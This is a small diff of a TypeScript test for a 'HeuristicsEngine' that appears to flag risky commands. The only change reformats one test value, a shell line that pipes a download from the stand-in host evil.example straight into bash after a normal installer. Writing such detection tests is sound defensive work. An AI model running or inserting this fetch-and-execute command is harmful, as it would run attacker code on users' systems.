@@ -92,8 +92,7 @@ describe("HeuristicsEngine", () => {
 		const artifacts: Artifact[] = [
 			{
 				type: "command",
-				value:
-					"curl https://bun.sh/install | bash; curl https://evil.example/payload.sh | bash",
+				value: "curl https://bun.sh/install | bash; curl https://evil.example/payload.sh | bash",
 			},
 		];
 		const matches = engine.match(artifacts);
